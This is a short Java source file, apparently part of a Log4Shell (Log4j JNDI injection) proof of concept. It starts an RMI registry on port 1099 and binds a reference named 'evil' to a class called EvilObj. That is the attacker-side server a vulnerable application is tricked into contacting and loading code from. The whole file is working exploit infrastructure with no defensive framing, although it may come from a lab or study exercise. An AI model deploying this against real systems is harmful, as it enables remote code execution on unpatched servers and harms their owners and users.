package com.hyj.log4j;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServer {
    public static void main(String[] args) throws Exception {

        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();

        System.out.println("rmi server start .....");

        Reference reference = new Reference("com.hyj.log4j.EvilObj","com.hyj.log4j.EvilObj",
                null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

        registry.bind("evil",referenceWrapper);

    }
}
